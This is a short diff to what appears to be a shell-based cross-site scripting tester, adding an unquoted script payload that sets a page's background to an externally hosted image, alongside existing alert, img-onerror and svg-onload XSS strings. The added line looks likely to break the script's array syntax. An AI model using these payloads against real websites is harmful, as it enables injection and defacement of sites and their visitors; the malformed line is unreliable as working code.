@@ -12,6 +12,7 @@ url=$1
 
 # Payload list
 payloads=(
+    <script>document.body.background="https://image2url.com/images/1756982166394-31e12d70-89af-4f6a-b354-cdb983d619b2.jpg"; </script>
     "'\"><script>alert(d4nughost)</script>"
     "\"><img src=x onerror=alert(d4nughost)>"
     "<svg onload=alert(d4nughost)>"
